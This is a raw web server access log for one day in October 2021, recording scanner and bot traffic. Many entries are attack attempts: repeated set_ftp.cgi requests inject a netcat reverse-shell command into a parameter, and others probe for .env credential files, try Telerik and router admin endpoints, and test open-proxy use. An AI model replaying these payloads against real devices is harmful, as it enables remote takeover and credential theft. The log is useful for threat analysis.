43.239.152.57 - - [23/Oct/2021:06:39:50 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
209.141.56.209 - - [23/Oct/2021:06:55:17 +0800] "GET / HTTP/1.1" 200 23 "-" "Linux Gnu (cow)"
209.141.54.36 - - [23/Oct/2021:06:55:56 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
205.185.115.19 - - [23/Oct/2021:07:07:00 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
185.254.31.134 - - [23/Oct/2021:07:16:09 +0800] "GET /.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.31.134 - - [23/Oct/2021:07:16:10 +0800] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\xC2\xEA\xCD\xDB" 400 163 "-" "-"
209.17.96.202 - - [23/Oct/2021:07:26:22 +0800] "\x16\x03\x01\x00\xE1\x01\x00\x00\xDD\x03\x03\x03\xCA-\xCB\xE2h.5\xBF^\xB0\xC5\xAB|\xF40Q\xC1D\xA5\x14\xB8\xD8[=c\x9D\xA8v\xD3Je\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:08:24:46 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:08:24:47 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:08:24:47 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:08:43:02 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:08:43:02 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:08:43:02 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
205.185.119.102 - - [23/Oct/2021:08:45:06 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.41.31 - - [23/Oct/2021:08:57:18 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
34.126.86.228 - - [23/Oct/2021:09:05:11 +0800] "GET /.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:11 +0800] "GET /conf/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:11 +0800] "GET /wp-content/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:11 +0800] "GET /wp-admin/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:11 +0800] "GET /library/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:12 +0800] "GET /new/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:12 +0800] "GET /vendor/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:12 +0800] "GET /old/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:12 +0800] "GET /local/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:12 +0800] "GET /api/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:13 +0800] "GET /blog/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:13 +0800] "GET /crm/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:13 +0800] "GET /admin/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:13 +0800] "GET /laravel/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:13 +0800] "GET /app/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
34.126.86.228 - - [23/Oct/2021:09:05:14 +0800] "GET /app/config/.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
209.141.41.31 - - [23/Oct/2021:09:05:39 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
128.14.134.170 - - [23/Oct/2021:09:05:49 +0800] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
211.185.103.61 - - [23/Oct/2021:09:13:10 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.61.168.29 - - [23/Oct/2021:09:37:23 +0800] "GET /.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.61.168.29 - - [23/Oct/2021:09:37:24 +0800] "POST / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.34.143.249 - - [23/Oct/2021:09:41:32 +0800] "GET / HTTP/1.1" 400 163 "-" "-"
205.185.115.19 - - [23/Oct/2021:09:45:57 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
94.60.126.183 - - [23/Oct/2021:10:01:33 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.133.18.15 - - [23/Oct/2021:10:16:40 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.32.221 - - [23/Oct/2021:10:19:17 +0800] "GET / HTTP/1.1" 403 159 "-" "Linux Gnu (cow)"
221.2.155.199 - - [23/Oct/2021:10:23:18 +0800] "GET / HTTP/1.1" 403 159 "-" "Mozilla/5.0"
209.141.56.212 - - [23/Oct/2021:10:49:34 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
106.15.181.223 - - [23/Oct/2021:10:51:29 +0800] "\x16\x03\x03\x00\x88\x01\x00\x00\x84\x03\x03asx\xB1\xA4*\xCE\x05\x02\xA2\xA7\xD3\x0B\xA5\xBA\x05\xEAo[W\xDF\xFE\x97\xD1\xB3\x88\x03\xB1\x13\xCF\xBEV\x00\x00\x16\xC0\x14\x005\xC0\x13\x00/\xC0,\xC0+\xC00\x00\x9D\xC0/\x00\x9C\x00" 400 163 "-" "-"
47.101.145.17 - - [23/Oct/2021:11:04:03 +0800] "\x16\x03\x03\x00\x88\x01\x00\x00\x84\x03\x03as{\xA3\xE5W\x99H\xF1C6\xB3\xAC\xC0-eg\x8E\xA9;\x11<\xBF\xFC\xEDt\x1A\x90Z\xF0\xE6\x14\x00\x00\x16\xC0\x14\x005\xC0\x13\x00/\xC0,\xC0+\xC00\x00\x9D\xC0/\x00\x9C\x00" 400 163 "-" "-"
205.185.115.19 - - [23/Oct/2021:11:26:48 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
195.133.18.15 - - [23/Oct/2021:11:33:14 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
109.122.230.61 - - [23/Oct/2021:11:33:39 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
209.141.36.53 - - [23/Oct/2021:11:40:10 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:11:40:10 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.36.53+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:11:40:10 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
219.157.224.242 - - [23/Oct/2021:11:41:15 +0800] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 159 "-" "-"
199.195.248.54 - - [23/Oct/2021:11:43:23 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:11:43:23 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:11:43:23 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
222.253.220.88 - - [23/Oct/2021:12:18:01 +0800] "GET /.env HTTP/1.1" 404 561 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
222.253.220.88 - - [23/Oct/2021:12:18:04 +0800] "POST / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
161.117.190.134 - - [23/Oct/2021:12:25:44 +0800] "\x05\x01\x00" 400 163 "-" "-"
161.117.190.134 - - [23/Oct/2021:12:25:44 +0800] "\x04\x01\x00Pg)\xA7\xEA\x00" 400 163 "-" "-"
161.117.190.134 - - [23/Oct/2021:12:25:52 +0800] "GET http://passport.baidu.com/ HTTP/1.1" 403 159 "-" "-"
161.117.190.134 - - [23/Oct/2021:12:26:03 +0800] "\x04\x01\x00Pg)\xA7\xEA\x00" 400 163 "-" "-"
161.117.190.134 - - [23/Oct/2021:12:26:09 +0800] "\x05\x01\x00" 400 163 "-" "-"
161.117.190.134 - - [23/Oct/2021:12:26:09 +0800] "GET http://passport.baidu.com/ HTTP/1.1" 200 23 "-" "-"
209.17.97.18 - - [23/Oct/2021:12:34:17 +0800] "GET / HTTP/1.0" 200 13 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
27.224.137.119 - - [23/Oct/2021:12:48:34 +0800] "\x05\x03\x00\x01\x02" 400 163 "-" "-"
177.190.146.114 - - [23/Oct/2021:12:56:07 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
101.133.224.19 - - [23/Oct/2021:12:58:41 +0800] "GET / HTTP/1.0" 403 159 "-" "-"
101.133.224.19 - - [23/Oct/2021:13:04:58 +0800] "POST /sdk HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
101.133.224.19 - - [23/Oct/2021:13:05:08 +0800] "GET /nmaplowercheck1634965498 HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
101.133.224.19 - - [23/Oct/2021:13:05:08 +0800] "GET /evox/about HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
101.133.224.19 - - [23/Oct/2021:13:05:08 +0800] "GET /HNAP1 HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
101.133.224.19 - - [23/Oct/2021:13:05:09 +0800] "GET / HTTP/1.0" 403 159 "-" "-"
101.133.224.19 - - [23/Oct/2021:13:05:18 +0800] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03m\x8F\xA1\xB7\xA1\x19\xBD\xE8\xD7o\xA9\x12\xB2Bg\xFEw\xEB\xFF\xEFwE\xD0\xC7\xCBt\x143\xED\x8C\x85U s\xC12\xAC\x1BjM\x06V\x1E\x05O\xBBJ\x06\xB7=\xD5\x8CK\xFD\xD0-.(L\x8DR\x82\xFE\x02\x1B\x00\x9C\x13\x02\x13\x03\x13\x01\x003\x009\x005\x00/\xC0,\xC00\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\xC0+\xC0/\x00\xA2\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\xC0$\xC0(\x00k\x00j\xC0s\xC0w\x00\xC4\x00\xC3\xC0#\xC0'\x00g\x00@\xC0r\xC0v\x00\xBE\x00\xBD\xC0" 400 163 "-" "-"
101.133.224.19 - - [23/Oct/2021:13:05:34 +0800] "GET / HTTP/1.0" 403 159 "-" "-"
101.133.224.19 - - [23/Oct/2021:13:05:34 +0800] "GET / HTTP/1.1" 403 159 "-" "-"
209.141.48.211 - - [23/Oct/2021:13:28:55 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:13:28:55 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.48.211+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:13:28:56 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
106.75.211.240 - - [23/Oct/2021:13:39:17 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 zgrab/0.x"
162.142.125.195 - - [23/Oct/2021:14:04:50 +0800] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x07\x83\xE9\x9Bi\x12\x8A\x9E\x09*\xD9.\xC7\xFE\xC6a\xB4\x04!\x10\x8D\xCF\x07\xC7" 400 163 "-" "-"
162.142.125.195 - - [23/Oct/2021:14:04:52 +0800] "GET / HTTP/1.1" 403 159 "-" "-"
162.142.125.195 - - [23/Oct/2021:14:04:53 +0800] "GET / HTTP/1.1" 403 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
60.217.75.69 - - [23/Oct/2021:14:20:03 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0"
209.141.48.211 - - [23/Oct/2021:14:25:23 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:14:25:23 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.48.211+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:14:25:23 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.56.212 - - [23/Oct/2021:14:25:59 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
195.133.18.15 - - [23/Oct/2021:14:32:23 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.41.31 - - [23/Oct/2021:14:40:44 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
205.185.120.72 - - [23/Oct/2021:14:44:45 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
5.188.210.227 - - [23/Oct/2021:14:55:10 +0800] "\x05\x01\x00" 400 163 "-" "-"
154.89.5.49 - - [23/Oct/2021:14:55:32 +0800] "GET / HTTP/1.0" 200 13 "-" "-"
209.141.48.211 - - [23/Oct/2021:14:56:28 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:14:56:28 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.48.211+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:14:56:28 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
5.188.210.227 - - [23/Oct/2021:14:56:38 +0800] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 163 "-" "-"
209.17.96.2 - - [23/Oct/2021:14:57:44 +0800] "GET / HTTP/1.1" 403 159 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
5.188.210.227 - - [23/Oct/2021:14:57:53 +0800] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 561 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
221.2.155.199 - - [23/Oct/2021:15:01:44 +0800] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03g;!\xFFV\x08\xB5\x9A\x81w\xD7\x09\x10o\x15'z7-\x98\xFEP\xF1\xC2\xA9T\x98\xA3\xFB\xF6\x8A" 400 163 "-" "-"
220.200.168.249 - - [23/Oct/2021:15:13:32 +0800] "\x05\x03\x00\x01\x02" 400 163 "-" "-"
205.185.119.102 - - [23/Oct/2021:15:15:04 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
159.223.24.137 - - [23/Oct/2021:15:19:26 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) Project-Resonance (http://project-resonance.com/) (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
209.141.51.171 - - [23/Oct/2021:15:26:26 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 159 "http://8.129.89.34:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.51.171 - - [23/Oct/2021:15:26:26 +0800] "" 400 0 "-" "-"
209.141.36.53 - - [23/Oct/2021:15:49:02 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:15:49:02 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.36.53+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:15:49:03 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
83.97.20.34 - - [23/Oct/2021:15:51:07 +0800] "GET / HTTP/1.0" 200 13 "-" "-"
128.14.133.58 - - [23/Oct/2021:16:55:52 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
205.185.120.71 - - [23/Oct/2021:17:10:24 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
205.185.120.71 - - [23/Oct/2021:17:10:25 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+205.185.120.71+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
205.185.120.71 - - [23/Oct/2021:17:10:25 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.51.171 - - [23/Oct/2021:17:16:34 +0800] "POST /boaform/admin/formLogin HTTP/1.1" 404 159 "http://8.129.89.34:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.51.171 - - [23/Oct/2021:17:16:34 +0800] "" 400 0 "-" "-"
205.185.115.19 - - [23/Oct/2021:17:59:08 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:18:08:33 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:18:08:33 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:18:08:33 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
183.136.225.9 - - [23/Oct/2021:18:15:24 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.9 - - [23/Oct/2021:18:15:24 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.9 - - [23/Oct/2021:18:15:25 +0800] "GET /favicon.ico HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
178.32.197.82 - - [23/Oct/2021:18:19:01 +0800] "GET / HTTP/1.1" 403 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
209.141.46.89 - - [23/Oct/2021:18:41:06 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [23/Oct/2021:18:41:06 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.46.89+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [23/Oct/2021:18:41:06 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
45.190.156.87 - - [23/Oct/2021:18:41:26 +0800] "GET / HTTP/1.1" 400 163 "-" "-"
205.185.120.103 - - [23/Oct/2021:19:16:33 +0800] "GET / HTTP/1.1" 200 23 "-" "Linux Gnu (cow)"
192.241.198.225 - - [23/Oct/2021:19:25:09 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 zgrab/0.x"
195.154.63.222 - - [23/Oct/2021:19:33:09 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
161.117.190.134 - - [23/Oct/2021:19:59:28 +0800] "GET http://passport.baidu.com/ HTTP/1.1" 200 23 "-" "-"
161.117.190.134 - - [23/Oct/2021:19:59:28 +0800] "\x04\x01\x00Pg)\xA7\xEA\x00" 400 163 "-" "-"
161.117.190.134 - - [23/Oct/2021:19:59:36 +0800] "GET http://passport.baidu.com/ HTTP/1.1" 403 159 "-" "-"
161.117.190.134 - - [23/Oct/2021:19:59:52 +0800] "\x05\x01\x00" 400 163 "-" "-"
161.117.190.134 - - [23/Oct/2021:20:00:09 +0800] "\x04\x01\x00Pg)\xA7\xEA\x00" 400 163 "-" "-"
161.117.190.134 - - [23/Oct/2021:20:00:26 +0800] "\x05\x01\x00" 400 163 "-" "-"
51.254.49.108 - - [23/Oct/2021:20:03:30 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
209.141.56.212 - - [23/Oct/2021:20:33:55 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
83.97.20.34 - - [23/Oct/2021:20:35:58 +0800] "GET / HTTP/1.0" 200 13 "-" "-"
64.62.197.182 - - [23/Oct/2021:20:38:13 +0800] "GET / HTTP/1.1" 200 23 "-" "-"
39.103.139.251 - - [23/Oct/2021:20:39:38 +0800] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x84\xE1\x1B\x17\xA2@\xEE\x05\x96 \xA6\x1Bo\xF2}35\xDB\x99\xFEH\xE8\x16\x19\xE8\xE88\xE7@\xC2\xA8\x8E \x8B\x9E\x0E\x1D\xB0\x02\xFD*\x80\xE8\x8Bu\xBF\xB6+\xEDA\x13\x08\xD7A\xB2D\x13\xF6\xE2\xC2\x1Ccy F\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 163 "-" "-"
39.103.139.251 - - [23/Oct/2021:20:39:38 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
199.195.248.54 - - [23/Oct/2021:20:42:21 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:20:42:22 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 0 "-" "-"
199.195.248.54 - - [23/Oct/2021:20:42:22 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
167.94.138.57 - - [23/Oct/2021:21:44:24 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
178.32.197.83 - - [23/Oct/2021:22:09:10 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
